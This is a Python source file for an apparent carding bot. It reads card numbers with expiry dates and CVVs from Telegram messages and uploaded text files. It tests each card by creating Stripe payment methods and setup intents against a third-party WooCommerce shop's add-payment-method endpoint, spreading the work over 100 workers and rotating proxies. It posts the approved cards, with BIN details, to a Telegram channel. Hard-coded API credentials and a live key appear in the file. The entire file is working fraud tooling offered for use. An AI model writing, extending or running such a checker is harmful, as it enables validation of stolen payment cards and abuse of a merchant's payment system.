import asyncio, aiohttp, re, os
from aiohttp import ClientSession, TCPConnector
from telethon import TelegramClient, events
from flask import Flask
from threading import Thread

API_ID = 28909605
API_HASH = '79620d3ae963bc568b92375dff884c13'
SESSION_NAME = 'ccsession'
CHANNEL_USERNAME = 'sendmeccs'

DOMAIN = "https://infiniteautowerks.com/"
PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
GATEWAY_NAME = "Stripe Auth"

MAX_WORKERS = 100
checked_ccs = set()
proxy_list = []

flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Checker Bot is Running"

@flask_app.route('/healthz')
def health():
    return "OK"

def run_flask():
    flask_app.run(host="0.0.0.0", port=10000)

async def load_proxies():
    global proxy_list
    try:
        with open("proxies.txt") as f:
            proxy_list = [line.strip() for line in f if line.strip()]
    except:
        proxy_list = []

def get_proxy():
    if not proxy_list:
        return None
    return f"http://{proxy_list[asyncio.current_task().get_name().__hash__() % len(proxy_list)]}"

def parseX(data, start, end):
    try:
        return data.split(start)[1].split(end)[0]
    except:
        return "None"

async def bin_lookup(bin_num, session):
    try:
        async with session.get(f"https://lookup.binlist.net/{bin_num}", timeout=10) as resp:
            if resp.status == 200:
                data = await resp.json()
                brand = data.get("scheme", "N/A").upper()
                type_ = data.get("type", "N/A").title()
                bank = data.get("bank", {}).get("name", "N/A")
                country = data.get("country", {}).get("name", "N/A")
                emoji = data.get("country", {}).get("emoji", "")
                return f"{brand} - {type_}\n𝐈𝐬𝐬𝐮𝐞𝐫: {bank}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {emoji}"
    except:
        pass
    return "BIN Info Not Found"

async def checker_txt(client, cc_data):
    await ppc(client, cc_data, post_result=False)

async def checker_msg(client, cc_data):
    await ppc(client, cc_data, post_result=True)

async def ppc(client, cc_data, post_result=True):
    try:
        cc, mon, year, cvv = cc_data.split("|")
        if len(year) == 2:
            year = "20" + year
        normalized_cc = f"{cc}|{mon}|{year}|{cvv}"
        if normalized_cc in checked_ccs:
            return
        checked_ccs.add(normalized_cc)
    except:
        return

    proxy = get_proxy()
    connector = TCPConnector(ssl=False) if not proxy else None
    proxy_url = proxy if proxy else None

    async with aiohttp.ClientSession(connector=connector) as my_session:
        headers = {"user-agent": "Mozilla/5.0", "referer": f"{DOMAIN}/my-account/payment-methods/"}
        try:
            req = await my_session.get(f"{DOMAIN}/my-account/add-payment-method/", headers=headers, proxy=proxy_url)
            res1 = await req.text()
            nonce = parseX(res1, '"createAndConfirmSetupIntentNonce":"', '"')
        except:
            return

        if nonce == "None":
            return

        data2 = {
            "type": "card", "card[number]": cc, "card[cvc]": cvv, "card[exp_year]": year[-2:],
            "card[exp_month]": mon, "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US", "key": PK, "_stripe_version": "2024-06-20",
        }
        headers2 = {
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0",
        }
        try:
            req2 = await my_session.post("https://api.stripe.com/v1/payment_methods", data=data2, headers=headers2, proxy=proxy_url)
            res2 = await req2.text()
            pmid = parseX(res2, '"id": "', '"')
        except:
            return

        if pmid == "None":
            return

        data3 = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        headers3 = {
            "x-requested-with": "XMLHttpRequest",
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "user-agent": "Mozilla/5.0",
        }

        try:
            req3 = await my_session.post(f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=data3, headers=headers3, proxy=proxy_url)
            res3 = await req3.text()
        except:
            return

        if "succeeded" in res3:
            bininfo = await bin_lookup(cc[:6], my_session)
            msg = f"""
✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝

𝗖𝗮𝗿𝗱: {normalized_cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {GATEWAY_NAME}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Approved

𝗜𝗻𝗳𝗼: {bininfo}
"""
            if post_result:
                try:
                    await client.send_message(CHANNEL_USERNAME, msg)
                    print(f"[✅] Sent: {normalized_cc}")
                except Exception as e:
                    print(f"[❌] Failed to post: {e}")

async def worker(queue, client):
    while True:
        cc, is_txt = await queue.get()
        if cc not in checked_ccs:
            if is_txt:
                await checker_txt(client, cc)
            else:
                await checker_msg(client, cc)
        queue.task_done()

async def main():
    await load_proxies()
    queue = asyncio.Queue()
    client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        text = event.raw_text
        all_ccs = set()
        is_txt = False

        if event.document and event.document.mime_type == "text/plain":
            try:
                path = await event.download_media()
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        cc = re.findall(r"\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", line)
                        all_ccs.update(cc)
                is_txt = True
            except Exception as e:
                print(f"[❌] Error reading txt: {e}")
                return
        else:
            lines = text.splitlines()
            for line in lines:
                if '|' in line:
                    cc = re.findall(r"\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", line)
                    all_ccs.update(cc)

        for cc in all_ccs:
            await queue.put((cc, is_txt))

    await client.start()
    print("[🟢] Listening for CCs...")

    for _ in range(MAX_WORKERS):
        asyncio.create_task(worker(queue, client))

    await client.run_until_disconnected()

if __name__ == "__main__":
    Thread(target=run_flask).start()
    asyncio.run(main())
